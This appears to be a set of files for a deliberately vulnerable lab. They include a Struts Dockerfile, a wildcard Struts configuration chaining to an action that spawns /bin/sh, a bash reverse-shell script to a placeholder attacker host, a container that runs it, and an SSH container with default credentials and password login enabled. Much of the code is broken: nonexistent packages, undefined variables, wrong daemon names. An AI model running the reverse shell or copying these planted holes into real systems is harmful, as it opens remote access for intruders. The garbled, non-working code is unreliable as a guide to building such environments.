1. Dockerfile (Dockerfile.struts)

```Dockerfile
FROM openjdk:8-jre-alpine

# Install Apache Struts 2.x (outdated and vulnerable)
RUN apk add --no-cache struts2

# Copy the vulnerable web application
COPY webapp /usr/local/struts2-app/

# Expose the HTTP port (8080)
EXPOSE 8080

# Run the Apache Struts web application
CMD ["java", "-jar", "/usr/local/struts2-app/struts2-core-2.x.jar", "-Dstruts.webapp=/"]
```

2. Vulnerable web application (webapp/WEB-INF/struts.xml)

```xml
<!-- Struts configuration file with the vulnerable action -->
<action name="*">
    <result>/index.jsp</result>
</action>
<action name="exec" class="com.example.ExecuteShell">
    <result name="success">/index.jsp</result>
</action>
<action name="*_exec">
    <result type="chain" name="exec">/index.jsp</result>
</action>
<action name="*_exec*">
    <result type="chain" name="exec">/index.jsp</result>
</action>
<action name="*_exec**">
    <result type="chain" name="exec">/index.jsp</result>
</action>
```

3. Vulnerable Java class (webapp/WEB-INF/classes/com/example/ExecuteShell.java)

```java
package com.example;

import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.http.HttpServletResponse;

public class ExecuteShell {
    public String execute() throws IOException {
        Process process = Runtime.getRuntime().exec("/bin/sh");
        PrintWriter writer = response.getWriter();
        writer.println("Executing command: /bin/sh");
        process.getInputStream().close();
        process.waitFor();
        writer.close();
        return SUCCESS;
    }
}
```

4. Netcat reverse shell script (reverse_shell.sh)

```bash
#!/bin/sh
bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1
```

5. Dockerfile (Dockerfile.netcat)

```Dockerfile
FROM alpine:latest

# Copy the reverse shell script
COPY reverse_shell.sh /

# Set the executable permission for the reverse shell script
RUN chmod +x /reverse_shell.sh

# Expose a high port (e.g., 4444)
EXPOSE 4444

# Run the reverse shell script
CMD ["/reverse_shell.sh"]
```

6. Dockerfile (Dockerfile.ssh)

```Dockerfile
FROM alpine:latest

# Install OpenSSH server
RUN apk add --no-cache openSSH

# Set default username and password (e.g., username: user, password: password)
ENV USER user
ENV PASSWORD password

# Set SSH port (e.g., 2222)
EXPOSE 2222

# Configure SSH to allow password authentication
RUN sed -i 's/#PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Start the OpenSSH server
CMD ["ssh-daemon", "-D"]
```